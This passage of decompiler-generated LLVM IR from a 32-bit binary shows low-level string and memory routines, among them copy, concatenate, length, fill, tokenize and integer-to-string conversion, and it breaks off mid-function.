  br i1 %or.cond, label %dec_label_pc_403f2c, label %dec_label_pc_403d88

dec_label_pc_403d88:                              ; preds = %dec_label_pc_403d2c
  %v3_403d8c = load i32, i32* @global_var_449c28.96, align 4
  call void @__pseudo_call(i32 %v3_403d8c)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v2_403da4 = ptrtoint i32* %tmp11 to i32
  %v2_403dac = ptrtoint i32* %tmp12 to i32
  %v2_403e84 = ptrtoint i32* %tmp13 to i32
  %v2_403dfc = ptrtoint i32* %tmp14 to i32
  br label %dec_label_pc_403da0

dec_label_pc_403da0:                              ; preds = %dec_label_pc_403dcc, %dec_label_pc_403d88
  store i32 16, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403da4

dec_label_pc_403da4:                              ; preds = %dec_label_pc_403e80, %dec_label_pc_403da0
  store i32 16, i32* %tmp13, align 4
  store i32 %v2_403dac, i32* %v1.global-to-local, align 4
  store i32 %v2_403da4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403db4

dec_label_pc_403db4:                              ; preds = %dec_label_pc_403db4, %dec_label_pc_403da4
  %v0_403db4 = phi i32 [ %v1_403db8, %dec_label_pc_403db4 ], [ %v2_403da4, %dec_label_pc_403da4 ]
  %v1_403db4 = inttoptr i32 %v0_403db4 to i32*
  store i32 0, i32* %v1_403db4, align 4
  %v0_403db8 = load i32, i32* %v0.global-to-local, align 4
  %v1_403db8 = add i32 %v0_403db8, 4
  store i32 %v1_403db8, i32* %v0.global-to-local, align 4
  %v1_403dbc = load i32, i32* %v1.global-to-local, align 4
  %v2_403dbc = icmp eq i32 %v1_403db8, %v1_403dbc
  br i1 %v2_403dbc, label %dec_label_pc_403dc0, label %dec_label_pc_403db4

dec_label_pc_403dc0:                              ; preds = %dec_label_pc_403db4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_403dc8 = load i32, i32* %s2.global-to-local, align 4
  %v2_403dc8 = icmp eq i32 %v0_403dc8, -1
  %v4_403dc8 = udiv i32 %v0_403dc8, 32
  store i32 %v4_403dc8, i32* %s1.global-to-local, align 4
  br i1 %v2_403dc8, label %dec_label_pc_403dc0.dec_label_pc_403e30_crit_edge, label %dec_label_pc_403dcc

dec_label_pc_403dc0.dec_label_pc_403e30_crit_edge: ; preds = %dec_label_pc_403dc0
  %v0_403e30.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403e30

dec_label_pc_403dcc:                              ; preds = %dec_label_pc_403dc0
  store i32 %v2_403e84, i32* %v0.global-to-local, align 4
  %v1_403dd4 = mul nuw nsw i32 %v4_403dc8, 4
  %v2_403dd8 = add i32 %v1_403dd4, %v2_403e84
  %v1_403ddc = add i32 %v2_403dd8, 28
  %v2_403ddc = inttoptr i32 %v1_403ddc to i32*
  %v3_403ddc = load i32, i32* %v2_403ddc, align 4
  %v1_403de0 = urem i32 %v0_403dc8, 32
  store i32 %v1_403de0, i32* @s0, align 4
  %v2_403de8 = shl i32 1, %v1_403de0
  %v2_403dec = or i32 %v3_403ddc, %v2_403de8
  store i32 %v2_403dec, i32* %v1.global-to-local, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  %v0_403df4 = load i32, i32* %gp.global-to-local, align 4
  %v1_403df4 = add i32 %v0_403df4, -32192
  %v2_403df4 = inttoptr i32 %v1_403df4 to i32*
  %v3_403df4 = load i32, i32* %v2_403df4, align 4
  store i32 10, i32* %tmp14, align 4
  store i32 %v2_403dfc, i32* %v0.global-to-local, align 4
  store i32 %v2_403dec, i32* %v2_403ddc, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403df4)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v0_403e20 = load i32, i32* %v0.global-to-local, align 4
  %v1_403e20 = icmp eq i32 %v0_403e20, 0
  store i32 %v2_403dfc, i32* %v1.global-to-local, align 4
  br i1 %v1_403e20, label %dec_label_pc_403da0, label %dec_label_pc_403e24

dec_label_pc_403e24:                              ; preds = %dec_label_pc_403dcc
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403e30

dec_label_pc_403e30:                              ; preds = %dec_label_pc_403dc0.dec_label_pc_403e30_crit_edge, %dec_label_pc_403e24
  %v0_403e30 = phi i32 [ %v0_403e30.pre, %dec_label_pc_403dc0.dec_label_pc_403e30_crit_edge ], [ %v2_403d34, %dec_label_pc_403e24 ]
  %v1_403e30 = add i32 %v0_403e30, -32236
  %v2_403e30 = inttoptr i32 %v1_403e30 to i32*
  %v3_403e30 = load i32, i32* %v2_403e30, align 4
  call void @__pseudo_call(i32 %v3_403e30)
  %v0_403e48 = load i32, i32* %v0.global-to-local, align 4
  %v2_403e48 = zext i32 %v0_403e48 to i64
  %v4_403e48 = mul nuw i64 %v2_403e48, 3435973837
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v3_403e54 = load i32, i32* @global_var_449cb0.77, align 4
  %v1_403e5c1 = udiv i64 %v4_403e48, 17179869184
  %v1_403e5c = trunc i64 %v1_403e5c1 to i32
  store i32 %v1_403e5c, i32* %v1.global-to-local, align 4
  %v1_403e603 = mul nuw nsw i64 %v1_403e5c1, 4
  %v1_403e60 = trunc i64 %v1_403e603 to i32
  %v2_403e64.neg = sub i32 %v0_403e48, %v1_403e5c
  %v2_403e68 = sub i32 %v2_403e64.neg, %v1_403e60
  store i32 %v2_403e68, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403e54)
  %v0_403e7c = load i32, i32* %v1.global-to-local, align 4
  %v2_403e7c = icmp eq i32 %v0_403e7c, %v2_403e68
  %v3_403e7c = load i32, i32* %s1.global-to-local, align 4
  %v4_403e7c = mul i32 %v3_403e7c, 4
  store i32 %v4_403e7c, i32* %v0.global-to-local, align 4
  br i1 %v2_403e7c, label %dec_label_pc_403f1c, label %dec_label_pc_403e80

dec_label_pc_403e80:                              ; preds = %dec_label_pc_403e30
  %v2_403e88 = add i32 %v4_403e7c, %v2_403e84
  store i32 %v2_403e88, i32* %v0.global-to-local, align 4
  %v1_403e8c = add i32 %v2_403e88, 28
  %v2_403e8c = inttoptr i32 %v1_403e8c to i32*
  %v3_403e8c = load i32, i32* %v2_403e8c, align 4
  %v1_403e94 = load i32, i32* @s0, align 4
  %tmp17 = shl i32 1, %v1_403e94
  %v1_403e986 = and i32 %tmp17, %v3_403e8c
  %v1_403e9c = icmp eq i32 %v1_403e986, 0
  store i32 16, i32* %v0.global-to-local, align 4
  br i1 %v1_403e9c, label %dec_label_pc_403da4, label %dec_label_pc_403ea0

dec_label_pc_403ea0:                              ; preds = %dec_label_pc_403e80
  %v3_403ea4 = load i32, i32* @global_var_449c6c.183, align 4
  call void @__pseudo_call(i32 %v3_403ea4)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v3_403ebc = load i32, i32* @global_var_449b98.184, align 4
  call void @__pseudo_call(i32 %v3_403ebc)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v3_403ed4 = load i32, i32* @global_var_449b9c.185, align 4
  call void @__pseudo_call(i32 %v3_403ed4)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v3_403eec = load i32, i32* @global_var_449b48.186, align 4
  call void @__pseudo_call(i32 %v3_403eec)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  %v3_403f04 = load i32, i32* @global_var_449c50.75, align 4
  call void @__pseudo_call(i32 %v3_403f04)
  store i32 %v2_403d34, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403f1c

dec_label_pc_403f1c:                              ; preds = %dec_label_pc_403e30, %dec_label_pc_403ea0
  %v3_403f1c = load i32, i32* @global_var_449b68.95, align 4
  call void @__pseudo_call(i32 %v3_403f1c)
  %v4_403f40.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403f2c

dec_label_pc_403f2c:                              ; preds = %dec_label_pc_403d2c, %dec_label_pc_403f1c
  %v4_403f40 = phi i32 [ -1, %dec_label_pc_403d2c ], [ %v4_403f40.pre, %dec_label_pc_403f1c ]
  ret i32 %v4_403f40

; uselistorder directives
  uselistorder i32 %v4_403e7c, { 1, 0 }
  uselistorder i32 %v1_403de0, { 1, 0 }
  uselistorder i32 %v1_403db8, { 1, 2, 0 }
  uselistorder i32 %v2_403d34, { 9, 7, 8, 5, 6, 4, 0, 3, 2, 1, 10 }
  uselistorder i32* %tmp14, { 1, 0 }
  uselistorder i32* %tmp13, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 2, 3, 0, 1, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16 }
  uselistorder i64 4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_403f2c, { 1, 0 }
  uselistorder label %dec_label_pc_403f1c, { 1, 0 }
  uselistorder label %dec_label_pc_403e30, { 1, 0 }
}

define i32 @function_403f48() local_unnamed_addr {
dec_label_pc_403f48:
  %v0_403f48 = load i32, i32* @v0, align 4
  ret i32 %v0_403f48
}

define i32 @function_403f4c() local_unnamed_addr {
dec_label_pc_403f4c:
  %v0_403f54.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_403f50

dec_label_pc_403f50:                              ; preds = %dec_label_pc_403f50, %dec_label_pc_403f4c
  %v0_403f54 = phi i32 [ %v3_403f5c, %dec_label_pc_403f50 ], [ %v0_403f54.pre, %dec_label_pc_403f4c ]
  %v0_403f50 = phi i32 [ %v1_403f50, %dec_label_pc_403f50 ], [ 0, %dec_label_pc_403f4c ]
  %v1_403f50 = add i32 %v0_403f50, 1
  %v1_403f54 = inttoptr i32 %v0_403f54 to i8*
  %v2_403f54 = load i8, i8* %v1_403f54, align 1
  %v1_403f5c = icmp eq i8 %v2_403f54, 0
  %v3_403f5c = add i32 %v0_403f54, 1
  br i1 %v1_403f5c, label %dec_label_pc_403f60, label %dec_label_pc_403f50

dec_label_pc_403f60:                              ; preds = %dec_label_pc_403f50
  ret i32 %v1_403f50

; uselistorder directives
  uselistorder i32 %v0_403f54, { 1, 0 }
}

define i32 @function_403f6c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f6c:
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403f70

dec_label_pc_403f70:                              ; preds = %dec_label_pc_403f70, %dec_label_pc_403f6c
  %v0_403f70 = phi i32 [ %v3_403f78, %dec_label_pc_403f70 ], [ %tmp, %dec_label_pc_403f6c ]
  %v1_403f70 = inttoptr i32 %v0_403f70 to i8*
  %v2_403f70 = load i8, i8* %v1_403f70, align 1
  %v3_403f70 = sext i8 %v2_403f70 to i32
  store i32 %v3_403f70, i32* %v0.global-to-local, align 4
  %v1_403f78 = icmp eq i8 %v2_403f70, 0
  %v3_403f78 = add i32 %v0_403f70, 1
  store i32 %v3_403f78, i32* %v1.global-to-local, align 4
  br i1 %v1_403f78, label %dec_label_pc_403f7c, label %dec_label_pc_403f70

dec_label_pc_403f7c:                              ; preds = %dec_label_pc_403f70
  store i32 %v0_403f70, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403f84

dec_label_pc_403f84:                              ; preds = %dec_label_pc_403f84, %dec_label_pc_403f7c
  %v2_403f8c = phi i32 [ %v3_403f90, %dec_label_pc_403f84 ], [ %v0_403f70, %dec_label_pc_403f7c ]
  %v0_403f84 = load i32, i32* @a1, align 4
  %v1_403f84 = inttoptr i32 %v0_403f84 to i8*
  %v2_403f84 = load i8, i8* %v1_403f84, align 1
  %v3_403f84 = sext i8 %v2_403f84 to i32
  store i32 %v3_403f84, i32* %v0.global-to-local, align 4
  %v1_403f88 = add i32 %v0_403f84, 1
  store i32 %v1_403f88, i32* @a1, align 4
  %v3_403f8c = inttoptr i32 %v2_403f8c to i8*
  store i8 %v2_403f84, i8* %v3_403f8c, align 1
  %v0_403f90 = load i32, i32* %v0.global-to-local, align 4
  %v1_403f90 = icmp eq i32 %v0_403f90, 0
  %v2_403f90 = load i32, i32* %v1.global-to-local, align 4
  %v3_403f90 = add i32 %v2_403f90, 1
  store i32 %v3_403f90, i32* %v1.global-to-local, align 4
  br i1 %v1_403f90, label %dec_label_pc_403f94, label %dec_label_pc_403f84

dec_label_pc_403f94:                              ; preds = %dec_label_pc_403f84
  store i32 %tmp, i32* %v0.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_403f90, { 1, 0 }
  uselistorder i32 %v3_403f78, { 1, 0 }
  uselistorder i32 %v0_403f70, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
}

define i32 @function_403fa0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_403fa0:
  %v0_403fa0 = load i32, i32* @v0, align 4
  ret i32 %v0_403fa0
}

define i32 @function_403fa4() local_unnamed_addr {
dec_label_pc_403fa4:
  %v1.global-to-local = alloca i32, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v3_403fb0.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_403fa8

dec_label_pc_403fa8:                              ; preds = %dec_label_pc_403fa8, %dec_label_pc_403fa4
  %v3_403fb0 = phi i32 [ %v1_403fb4, %dec_label_pc_403fa8 ], [ %v3_403fb0.pre, %dec_label_pc_403fa4 ]
  %v0_403fa8 = load i32, i32* @a1, align 4
  %v1_403fa8 = inttoptr i32 %v0_403fa8 to i8*
  %v2_403fa8 = load i8, i8* %v1_403fa8, align 1
  %v1_403fac = add i32 %v0_403fa8, 1
  store i32 %v1_403fac, i32* @a1, align 4
  %v4_403fb0 = inttoptr i32 %v3_403fb0 to i8*
  store i8 %v2_403fa8, i8* %v4_403fb0, align 1
  %v0_403fb4 = load i32, i32* @a0, align 4
  %v1_403fb4 = add i32 %v0_403fb4, 1
  store i32 %v1_403fb4, i32* @a0, align 4
  %v0_403fb8 = load i32, i32* @a2, align 4
  %v1_403fb8 = add i32 %v0_403fb8, -1
  store i32 %v1_403fb8, i32* @a2, align 4
  %v1_403fbc = load i32, i32* %v1.global-to-local, align 4
  %v2_403fbc = icmp eq i32 %v1_403fb8, %v1_403fbc
  br i1 %v2_403fbc, label %dec_label_pc_403fc0, label %dec_label_pc_403fa8

dec_label_pc_403fc0:                              ; preds = %dec_label_pc_403fa8
  %v2_403fc4 = sext i8 %v2_403fa8 to i32
  ret i32 %v2_403fc4

; uselistorder directives
  uselistorder i32 %v1_403fb4, { 1, 0 }
}

define i32 @function_403fcc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403fcc:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_403ff4

dec_label_pc_403ff4:                              ; preds = %dec_label_pc_403ff4, %dec_label_pc_403fcc
  %v2_404000 = phi i32 [ %tmp, %dec_label_pc_403fcc ], [ %v3_404000, %dec_label_pc_403ff4 ]
  %.0 = phi i32 [ undef, %dec_label_pc_403fcc ], [ %v1_403ffc, %dec_label_pc_403ff4 ]
  store i32 %.0, i32* %s0.global-to-local, align 4
  %v1_403ff8 = inttoptr i32 %v2_404000 to i8*
  %v2_403ff8 = load i8, i8* %v1_403ff8, align 1
  %v3_403ff8 = sext i8 %v2_403ff8 to i32
  store i32 %v3_403ff8, i32* @v0, align 4
  %v1_403ffc = add i32 %.0, 1
  store i32 %v1_403ffc, i32* @a2, align 4
  %v1_404000 = icmp eq i8 %v2_403ff8, 0
  %v3_404000 = add i32 %v2_404000, 1
  br i1 %v1_404000, label %dec_label_pc_404004, label %dec_label_pc_403ff4

dec_label_pc_404004:                              ; preds = %dec_label_pc_403ff4
  %v5_404010 = call i32 @function_403fa0(i32 %v1_403ffc, i32 %tmp, i32 %v1_403ffc)
  %v0_404018 = load i32, i32* %s0.global-to-local, align 4
  ret i32 %v0_404018

; uselistorder directives
  uselistorder i32 %v1_403ffc, { 1, 0, 3, 2 }
  uselistorder i32 %.0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_403fa0, { 3, 1, 2, 0 }
}

define i32 @function_404030(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404030:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %v1_404030 = mul i32 %arg1, 16777216
  %v1_404034 = sdiv i32 %v1_404030, 16777216
  store i32 %v1_404034, i32* %a1.global-to-local, align 4
  %v2_404040.pre = load i32, i32* @a0, align 4
  %extract.t8 = trunc i32 %v1_404034 to i8
  %v3_4040409 = inttoptr i32 %v2_404040.pre to i8*
  store i8 %extract.t8, i8* %v3_4040409, align 1
  %v0_40404410 = load i32, i32* @a0, align 4
  %v1_40404411 = add i32 %v0_40404410, 1
  store i32 %v1_40404411, i32* %a0.global-to-local, align 4
  %v0_40404812 = load i32, i32* @a2, align 4
  %v1_40404813 = add i32 %v0_40404812, -1
  store i32 %v1_40404813, i32* %a2.global-to-local, align 4
  %v2_40404c14 = icmp eq i32 %v0_40404812, 0
  br i1 %v2_40404c14, label %dec_label_pc_404050, label %dec_label_pc_404040.dec_label_pc_404040_crit_edge

dec_label_pc_404040.dec_label_pc_404040_crit_edge: ; preds = %dec_label_pc_404030, %dec_label_pc_404040.dec_label_pc_404040_crit_edge
  %v1_40404415 = phi i32 [ %v1_404044, %dec_label_pc_404040.dec_label_pc_404040_crit_edge ], [ %v1_40404411, %dec_label_pc_404030 ]
  %v0_404040.pre = load i32, i32* %a1.global-to-local, align 4
  %extract.t = trunc i32 %v0_404040.pre to i8
  %v3_404040 = inttoptr i32 %v1_40404415 to i8*
  store i8 %extract.t, i8* %v3_404040, align 1
  %v0_404044 = load i32, i32* %a0.global-to-local, align 4
  %v1_404044 = add i32 %v0_404044, 1
  store i32 %v1_404044, i32* %a0.global-to-local, align 4
  %v0_404048 = load i32, i32* %a2.global-to-local, align 4
  %v1_404048 = add i32 %v0_404048, -1
  store i32 %v1_404048, i32* %a2.global-to-local, align 4
  %v2_40404c = icmp eq i32 %v0_404048, 0
  br i1 %v2_40404c, label %dec_label_pc_404050, label %dec_label_pc_404040.dec_label_pc_404040_crit_edge

dec_label_pc_404050:                              ; preds = %dec_label_pc_404040.dec_label_pc_404040_crit_edge, %dec_label_pc_404030
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_404044, { 1, 0 }
  uselistorder i32 %v1_404034, { 1, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 5, 4, 6, 7, 9, 8, 11, 10, 12 }
  uselistorder label %dec_label_pc_404040.dec_label_pc_404040_crit_edge, { 1, 0 }
}

define i32 @function_40405c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40405c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_404068 = icmp eq i8* %arg1, null
  br i1 %v2_404068, label %dec_label_pc_404078.thread, label %dec_label_pc_404078

dec_label_pc_404078.thread:                       ; preds = %dec_label_pc_40405c
  br label %dec_label_pc_40407c

dec_label_pc_404078:                              ; preds = %dec_label_pc_40405c
  %v0_404078.pr = load i32, i32* @a0, align 4
  %v1_404078 = icmp eq i32 %v0_404078.pr, 0
  br i1 %v1_404078, label %dec_label_pc_40407c, label %dec_label_pc_404098.preheader

dec_label_pc_40407c:                              ; preds = %dec_label_pc_404078.thread, %dec_label_pc_404078
  %v3_404088 = load i8*, i8** @global_var_449d94.187, align 4
  %v4_404088 = ptrtoint i8* %v3_404088 to i32
  store i32 %v4_404088, i32* @a0, align 4
  %v1_404090 = icmp eq i8* %v3_404088, null
  br i1 %v1_404090, label %dec_label_pc_404134, label %dec_label_pc_404098.preheader

dec_label_pc_404098.preheader:                    ; preds = %dec_label_pc_404078, %dec_label_pc_40407c
  %v3_4040ec = phi i32 [ %v0_404078.pr, %dec_label_pc_404078 ], [ %v4_404088, %dec_label_pc_40407c ]
  br label %dec_label_pc_404098

dec_label_pc_404098:                              ; preds = %dec_label_pc_404098.preheader, %dec_label_pc_404098
  %v2_4040a4 = phi i32 [ 0, %dec_label_pc_404098.preheader ], [ %v3_4040a4, %dec_label_pc_404098 ]
  %v2_404098 = add i32 %v2_4040a4, %v3_4040ec
  %v1_40409c = inttoptr i32 %v2_404098 to i8*
  %v2_40409c = load i8, i8* %v1_40409c, align 1
  %v1_4040a4 = icmp eq i8 %v2_40409c, 0
  %v3_4040a4 = add i32 %v2_4040a4, 1
  br i1 %v1_4040a4, label %dec_label_pc_4040a8, label %dec_label_pc_404098

dec_label_pc_4040a8:                              ; preds = %dec_label_pc_404098
  %v0_4040b8.pre = load i32, i32* @a2, align 4
  br label %dec_label_pc_4040b8

dec_label_pc_4040b8:                              ; preds = %dec_label_pc_4040c8, %dec_label_pc_4040a8
  %v2_4040d4 = phi i32 [ %v3_4040d4, %dec_label_pc_4040c8 ], [ 0, %dec_label_pc_4040a8 ]
  %v0_4040b8 = phi i32 [ %v2_4040d0, %dec_label_pc_4040c8 ], [ %v0_4040b8.pre, %dec_label_pc_4040a8 ]
  %v1_4040b8 = inttoptr i32 %v0_4040b8 to i8*
  %v2_4040b8 = load i8, i8* %v1_4040b8, align 1
  %v3_4040bc = load i8, i8* %arg1, align 1
  %v2_4040c4 = icmp eq i8 %v3_4040bc, %v2_4040b8
  br i1 %v2_4040c4, label %dec_label_pc_4040e4, label %dec_label_pc_4040c8

dec_label_pc_4040c8:                              ; preds = %dec_label_pc_4040b8
  %v2_4040cc = icmp slt i32 %v2_4040d4, %v2_4040a4
  %v2_4040d0 = add i32 %v2_4040d4, %v3_4040ec
  store i32 %v2_4040d0, i32* @a2, align 4
  %v3_4040d4 = add nuw i32 %v2_4040d4, 1
  br i1 %v2_4040cc, label %dec_label_pc_4040b8, label %dec_label_pc_4040e4

dec_label_pc_4040e4:                              ; preds = %dec_label_pc_4040c8, %dec_label_pc_4040b8
  %v3_4040bc.lcssa = phi i8 [ %v3_4040bc, %dec_label_pc_4040c8 ], [ %v2_4040b8, %dec_label_pc_4040b8 ]
  %v0_40410c = phi i32 [ %v2_4040d0, %dec_label_pc_4040c8 ], [ %v0_4040b8, %dec_label_pc_4040b8 ]
  %v1_4040e4 = inttoptr i32 %v3_4040ec to i8*
  %v2_4040e4 = load i8, i8* %v1_4040e4, align 1
  %v2_4040ec = icmp eq i8 %v2_4040e4, %v3_4040bc.lcssa
  br i1 %v2_4040ec, label %dec_label_pc_4040f0, label %dec_label_pc_404104

dec_label_pc_4040f0:                              ; preds = %dec_label_pc_4040e4
  %v4_4040ec = add i32 %v3_4040ec, 1
  store i32 %tmp, i32* @a0, align 4
  %v4_404100 = inttoptr i32 %v4_4040ec to i8*
  store i8* %v4_404100, i8** @global_var_449d94.187, align 4
  br label %dec_label_pc_404104

dec_label_pc_404104:                              ; preds = %dec_label_pc_4040e4, %dec_label_pc_4040f0
  %v2_40410c = icmp eq i32 %v0_40410c, -1
  %v4_40410c = inttoptr i32 %v0_40410c to i8*
  store i8 0, i8* %v4_40410c, align 1
  br i1 %v2_40410c, label %dec_label_pc_404120, label %dec_label_pc_404110

dec_label_pc_404110:                              ; preds = %dec_label_pc_404104
  %v0_404114 = load i32, i32* @a2, align 4
  %v1_404114 = add i32 %v0_404114, 1
  %v4_40411c = inttoptr i32 %v1_404114 to i8*
  store i8* %v4_40411c, i8** @global_var_449d94.187, align 4
  br label %dec_label_pc_404120

dec_label_pc_404120:                              ; preds = %dec_label_pc_404104, %dec_label_pc_404110
  store i8* null, i8** @global_var_449d94.187, align 4
  %v1_404134.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_404134

dec_label_pc_404134:                              ; preds = %dec_label_pc_40407c, %dec_label_pc_404120
  %v1_404134 = phi i32 [ %v4_404088, %dec_label_pc_40407c ], [ %v1_404134.pre, %dec_label_pc_404120 ]
  ret i32 %v1_404134

; uselistorder directives
  uselistorder i32 %v0_40410c, { 1, 0 }
  uselistorder i32 %v2_4040d0, { 0, 2, 1 }
  uselistorder i32 %v2_4040d4, { 1, 0, 2 }
  uselistorder i32 %v2_4040a4, { 0, 2, 1 }
  uselistorder i32 %v3_4040ec, { 2, 3, 0, 1 }
  uselistorder i8** @global_var_449d94.187, { 3, 2, 1, 0 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder label %dec_label_pc_404134, { 1, 0 }
  uselistorder label %dec_label_pc_404120, { 1, 0 }
  uselistorder label %dec_label_pc_404104, { 1, 0 }
  uselistorder label %dec_label_pc_404098, { 1, 0 }
  uselistorder label %dec_label_pc_404098.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_40407c, { 1, 0 }
}

define i32 @function_40413c(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_40413c:
  %a0.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %lo.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %tmp, i32* @a2, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_404158 = load i32, i32* @a2, align 4
  %v1_404158 = icmp eq i32 %v0_404158, 0
  store i32 %v0_404158, i32* @s0, align 4
  br i1 %v1_404158, label %dec_label_pc_404214, label %dec_label_pc_40415c

dec_label_pc_40415c:                              ; preds = %dec_label_pc_40413c
  %v0_404160 = load i32, i32* %a0.global-to-local, align 4
  %v1_404160 = icmp eq i32 %v0_404160, 0
  br i1 %v1_404160, label %dec_label_pc_40420c, label %dec_label_pc_404164

dec_label_pc_404164:                              ; preds = %dec_label_pc_40415c
  %v2_40416c = icmp ne i32 %arg2, 10
  store i32 0, i32* %t0.global-to-local, align 4
  %v1_404174 = icmp sgt i32 %v0_404160, -1
  %or.cond = or i1 %v2_40416c, %v1_404174
  br i1 %or.cond, label %dec_label_pc_404184, label %dec_label_pc_404178

dec_label_pc_404178:                              ; preds = %dec_label_pc_404164
  %v1_40417c = sub i32 0, %v0_404160
  store i32 %v1_40417c, i32* %a0.global-to-local, align 4
  store i32 1, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_404184

dec_label_pc_404184:                              ; preds = %dec_label_pc_404164, %dec_label_pc_404178
  %v2_4041902 = phi i32 [ %v0_404160, %dec_label_pc_404164 ], [ %v1_40417c, %dec_label_pc_404178 ]
  store i32 32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_404190

dec_label_pc_404190:                              ; preds = %dec_label_pc_4041bc, %dec_label_pc_404184
  %v1_4041bc = phi i32 [ %v1_4041c4, %dec_label_pc_4041bc ], [ 32, %dec_label_pc_404184 ]
  %v2_4041b0 = phi i32 [ %v0_4041c8, %dec_label_pc_4041bc ], [ %v2_4041902, %dec_label_pc_404184 ]
  %v4_404190 = udiv i32 %v2_4041b0, %arg2
  store i32 %v4_404190, i32* %lo.global-to-local, align 4
  %v5_404190 = urem i32 %v2_4041b0, %arg2
  %v1_4041a0 = icmp slt i32 %v5_404190, 10
  %v3_4041a4 = add i32 %v5_404190, 48
  %extract.t9 = trunc i32 %v3_4041a4 to i8
  br i1 %v1_4041a0, label %dec_label_pc_4041bc, label %dec_label_pc_4041a8

dec_label_pc_4041a8:                              ; preds = %dec_label_pc_404190
  %v1_4041ac = add i32 %v5_404190, 55
  store i32 %v4_404190, i32* %lo.global-to-local, align 4
  %extract.t = trunc i32 %v1_4041ac to i8
  br label %dec_label_pc_4041bc

dec_label_pc_4041bc:                              ; preds = %dec_label_pc_4041a8, %dec_label_pc_404190
  %v0_4041c0.off0 = phi i8 [ %extract.t, %dec_label_pc_4041a8 ], [ %extract.t9, %dec_label_pc_404190 ]
  %v0_4041bc = load i32, i32* @sp, align 4
  %v2_4041bc = add i32 %v0_4041bc, %v1_4041bc
  %v3_4041c0 = add i32 %v2_4041bc, 24
  %v4_4041c0 = inttoptr i32 %v3_4041c0 to i8*
  store i8 %v0_4041c0.off0, i8* %v4_4041c0, align 1
  %v0_4041c4 = load i32, i32* %a2.global-to-local, align 4
  %v1_4041c4 = add i32 %v0_4041c4, -1
  store i32 %v1_4041c4, i32* %a2.global-to-local, align 4
  %v0_4041c8 = load i32, i32* %lo.global-to-local, align 4
  store i32 %v0_4041c8, i32* %a0.global-to-local, align 4
  %v1_4041cc = icmp eq i32 %v0_4041c8, 0
  br i1 %v1_4041cc, label %dec_label_pc_4041d0, label %dec_label_pc_404190

dec_label_pc_4041d0:                              ; preds = %dec_label_pc_4041bc
  %v0_4041d4 = load i32, i32* %t0.global-to-local, align 4
  %v1_4041d4 = icmp eq i32 %v0_4041d4, 0
  br i1 %v1_4041d4, label %dec_label_pc_4041e8, label %dec_label_pc_4041d8

dec_label_pc_4041d8:                              ; preds = %dec_label_pc_4041d0
  %v2_4041d4 = load i32, i32* @sp, align 4
  %v4_4041d4 = add i32 %v2_4041d4, %v1_4041c4
  %v3_4041e4 = add i32 %v4_4041d4, 24
  %v4_4041e4 = inttoptr i32 %v3_4041e4 to i8*
  store i8 45, i8* %v4_4041e4, align 1
  %v0_4041e8.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4041e8

dec_label_pc_4041e8:                              ; preds = %dec_label_pc_4041d0, %dec_label_pc_4041d8
  %v0_4041e8 = phi i32 [ %v1_4041c4, %dec_label_pc_4041d0 ], [ %v0_4041e8.pre, %dec_label_pc_4041d8 ]
  %v1_4041e8 = add i32 %v0_4041e8, 1
  store i32 %v1_4041e8, i32* %a2.global-to-local, align 4
  %v3_4041ec = load i32, i32* @global_var_449b78.59, align 4
